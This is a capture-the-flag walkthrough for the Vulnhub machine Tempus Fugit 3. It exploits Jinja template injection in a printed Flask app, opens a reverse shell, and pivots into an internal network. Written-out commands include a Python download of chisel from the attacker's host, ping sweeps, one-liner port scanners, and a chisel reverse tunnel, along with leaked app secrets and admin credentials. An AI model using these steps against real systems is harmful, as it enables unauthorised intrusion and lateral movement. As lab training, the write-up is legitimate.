<img width="1217" height="466" alt="image" src="https://github.com/user-attachments/assets/526d1b2c-c6c0-4cd6-b9d6-fe5e27a76f63" /># Tempus Fugit: 3 Walkthrough
# Description
```bash
Tempus Fugit is a Latin phrase that roughly translated as “time flies”.

This is an hard, real life box, created by @4nqr34z and @theart42 to be used as a CTF challenge on Bsides Newcastle 23. november 2019 and released on Vulnhub the same day.

In Tempus Fugit 3, the idea is still, like in the first two challenges; to create something “out of the ordinary”.

The vm contains 5 flags. If you don’t see them, you are not looking in the right place...

Need any hints? Feel free to contact us on Twitter: @4nqr34z or @theart42

DHCP-Client.

Tested both on Virtualbox and vmware

Health warning: For external use only

This works better with VirtualBox rather than VMware
```

# Exploitation
Let's start with network scan
```bash
Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 11 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 660                                                                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.100   58:11:22:85:0d:41      8     480  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.110   08:00:27:07:f8:19      1      60  PCS Systemtechnik GmbH
```
\
NExt , Open ports on the target machine
```bash
80/tcp http  nginx 1.14.2
```
\
Accessing port 80 on burpsuite
\
<img width="1712" height="642" alt="image" src="https://github.com/user-attachments/assets/bd46e24c-3820-49cf-9c9e-c4bec93fd60f" />
\
Nothing much on this page , just a login functionality
\
<img width="817" height="181" alt="image" src="https://github.com/user-attachments/assets/0e52ca58-be96-4a4f-a396-7221827779e9" />
\
Got pranked when i entered random credentials
\
<img width="1646" height="745" alt="image" src="https://github.com/user-attachments/assets/b9a67cd0-b55a-4c71-93bc-12a70c36ff60" />
\
When i entered a random endpoint to access
\
<img width="1707" height="762" alt="image" src="https://github.com/user-attachments/assets/250977ec-6337-45ee-b5f4-3611ceba9363" />
\
Since the page was displaying the "path i gave after /" i thought it could be SSTI and tested it
\
And it was Jinja ssti 
\
<img width="569" height="761" alt="image" src="https://github.com/user-attachments/assets/f8046543-7173-446a-a859-4107156f6f79" />
\
And i followed "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md" for further payloads
\
When i first checked if i could access the builtin functions and see which all were supported
\
<img width="519" height="124" alt="image" src="https://github.com/user-attachments/assets/5befdb30-17a4-42fe-98d2-8edd116ecd64" />
\
There were a lot 
\
<img width="1693" height="677" alt="image" src="https://github.com/user-attachments/assets/5a07465e-42c3-4d34-a628-16f5b9f38a80" />
\
So i copied it to a notepad file and searched for "__import"" 
\
<img width="1076" height="507" alt="image" src="https://github.com/user-attachments/assets/516af5a8-bbaf-413f-bd42-baaa6682150e" />
\
And it was there so i could use the next payload i found this from the cheatsheet and used the payload <img width="802" height="77" alt="image" src="https://github.com/user-attachments/assets/3368a570-6abf-4b5f-928e-9af752cc5e6b" />

\
<img width="1240" height="774" alt="image" src="https://github.com/user-attachments/assets/9c0efaca-45af-4fb2-8842-f57899ab7ce3" />
\
So now , we have Remote Code Execution
\
Then i checked  files in current dir
\
<img width="452" height="215" alt="image" src="https://github.com/user-attachments/assets/2dc512bd-aeb1-4d11-9a8c-dbe84d133ca3" />
\
```bash
from flask import Flask, render_template
import flask, flask_login
from urllib.parse import unquote
from pysqlcipher3 import dbapi2 as sqlcipher


app = Flask(__name__)
app.secret_key = "RmxhZzF7IEltcG9ydGFudCBmaW5kaW5ncyB9"

pra = 'pragma key="SecretssecretsSecrets..."'

try:
  with app.open_resource("static/file/f") as f:
    contents = f.read().decode('utf-8')
except:
    contents = ''    



def check(username):
    con = sqlcipher.connect('static/db2.db')
    con.execute(pra)
    userexists = False
    with con:
                cur = con.cursor()
                cur.execute('SELECT * FROM Users')
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    if uname==username:
                        userexists=True
    return userexists

def validate(username, password):
    con = sqlcipher.connect('static/db2.db')
    con.execute(pra)
    completion = False
    with con:
                cur = con.cursor()
                cur.execute('SELECT * FROM Users')
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    pw = row[1]
                    if uname==username:
                        completion=check_password(password, pw)
    return completion

def check_password(hashed_password, user_password):
   
    return hashed_password == user_password
    

login_manager = flask_login.LoginManager()

login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass


@login_manager.user_loader
def user_loader(email):
    
    if check(email) ==False:


        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = flask.request.form.get("email")
    if not check(email):
   
        return

    user = User()
    user.id = email


    return user



@app.route("/index.html")
@app.route("/")
def index():
     return render_template("index.html")

   
@app.route("/login", methods=["GET", "POST"])
def login():
    print('Login')
    if flask.request.method == "POST":
      
        username = flask.request.form["email"]
        password = flask.request.form["password"]
        completion = validate(username, password)
        if completion == False:
            return render_template("unauth.html")
        else:
             user = User()
             user.id = username
             flask_login.login_user(user)

             return flask.redirect(flask.url_for("protected"))

    
    return render_template("bad.html")
   



@app.route("/protected")
@flask_login.login_required
def protected():
  
    return render_template("protected.html", luser = flask_login.current_user.id, contents=contents )

@app.route("/logout")
def logout():
    flask_login.logout_user()
    return render_template("logout.html")

@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template("unauth.html")

@app.errorhandler(404)
def not_found(e):
     message = unquote(flask.request.url)
     message =  flask.render_template_string(message)
     return render_template("404.html", dir=dir,
        help=help,
        locals=locals, message=message), 404

@app.errorhandler(500)
def internal_error(error):

    return flask.redirect(flask.url_for("login"))




if __name__ == "__main__":
    app.run()
```
\
Secret key when decoded
\
<img width="776" height="52" alt="image" src="https://github.com/user-attachments/assets/ea3005e8-7e6a-4323-855b-8db31628f9d9" />
\
Using this payload i got a terminal reverse shell
\
<img width="562" height="53" alt="image" src="https://github.com/user-attachments/assets/dd25431d-cd69-4f0b-93d4-3463da9c679b" />
\
Since the code used sqlcipher to connect , the service should be there
\
<img width="425" height="77" alt="image" src="https://github.com/user-attachments/assets/f765ad0f-56f8-4c22-b88d-a01bc9b3c0f5" />
\
<img width="896" height="82" alt="image" src="https://github.com/user-attachments/assets/ea780654-151f-44b9-8fb9-d03317141c93" />
\
Now we interact with the db
\
<img width="681" height="149" alt="image" src="https://github.com/user-attachments/assets/ed386414-0e5b-40a7-9eea-5e37fb634f71" />
\
<img width="364" height="92" alt="image" src="https://github.com/user-attachments/assets/a5f8e12c-74b6-4768-a5b0-b43d1504b545" />
\
Another Flag
\
<img width="808" height="54" alt="image" src="https://github.com/user-attachments/assets/de352a8a-a73d-4aa0-9035-c3e51d19a9ea" />
\
After loggin in with pws and accessing /protected
\
<img width="1393" height="617" alt="image" src="https://github.com/user-attachments/assets/ff22e896-ba45-49e6-8745-bcf052479bf8" />
\
Actually in the page source there was another string
\
<img width="1263" height="160" alt="image" src="https://github.com/user-attachments/assets/35f03b04-1a95-4ff7-93a6-47de17f1b640" />
\
<img width="1074" height="52" alt="image" src="https://github.com/user-attachments/assets/7c29b10f-c471-49bd-92eb-a42f2203e712" />
\
Then i used a mini python script to check which all ports are open on current host , since most common binaries were not installed on the system
```bash
www-data@TF3:/tmp$ python
Python 3.6.9 (default, Sep 12 2019, 16:33:49) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket
>>> [print(f"Port {p}: OPEN") for p in range(1, 65536) if not socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(('127.0.0.1', p))]
Port 80: OPEN
Port 37860: OPEN
[None, None]
```
\
Then i transferred fiels using pythons urllib module
```bash
www-data@TF3:/tmp$ python
Python 3.6.9 (default, Sep 12 2019, 16:33:49) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import urllib.request
>>> urllib.request.urlretrieve('http://192.168.0.124:9000/chisel_1.11.3_linux_amd64', 'chisel')
('chisel', <http.client.HTTPMessage object at 0x7fa8f39825f8>)
>>> exit()
```
\
But no use
\
Then i tried to find out all the devices in the network 192.168.100.x (since we found this subnet ip in /etc/hosts file)
```bash
for i in {1..254}; do ping -c 1 -W 1 192.168.100.$i >/dev/null && echo "192.168.100.$i is alive" & done
```
\
Got 192.168.100.1 and 192.168.100.100, so i used python 1 liner to find open ports
```bash
www-data@TF3:/tmp$ python -c "import socket;s=socket.socket;exec('for p in range(1,65536):\\n try:\\n  sock=socket.socket();sock.settimeout(0.5);sock.connect((\\\"192.168.100.1\\\",p));print(f\\\"Port {p}: OPEN\\\");sock.close()\\n except:pass')"
Port 80: OPEN
Port 443: OPEN
Port 45599: OPEN
www-data@TF3:/tmp$ python -c "import socket;s=socket.socket;exec('for p in range(1,65536):\\n try:\\n  sock=socket.socket();sock.settimeout(0.5);sock.connect((\\\"192.168.100.100\\\",p));print(f\\\"Port {p}: OPEN\\\");sock.close()\\n except:pass')"
Port 80: OPEN
Port 57890: OPEN
```
\
Then i was checking all the ports 1 by 1 , when i found a new website running on port 443 of 192.168.100.1
```bash
www-data@TF3:/tmp$ ./chisel client 192.168.0.124:9001 R:9999:192.168.100.1:443
2026/04/24 11:14:11 client: Connecting to ws://192.168.0.124:9001
2026/04/24 11:14:11 client: Connected (Latency 882.776µs)
```
\
<img width="1641" height="738" alt="image" src="https://github.com/user-attachments/assets/49f747bf-663c-49fe-9336-d8e42a2944b1" />
\
After scrolling down , we see that it is some processwire cms
\
<img width="1027" height="600" alt="image" src="https://github.com/user-attachments/assets/32c70c54-1740-4219-aa51-47216f1aa6b1" />
\
Login page 
\
<img width="1217" height="466" alt="image" src="https://github.com/user-attachments/assets/6445b411-be0e-4352-826e-4f34717213df" />
\
And since the papragraph before said "under the supervision of Hugh"
\
I tried the previous known credentials , but didnt work , so after some hint , i used the creds
```bash
admin : S0secretPassW0rd
```
\
<img width="1707" height="631" alt="image" src="https://github.com/user-attachments/assets/d520050c-496e-436f-857d-67d0f6faf930" />
\
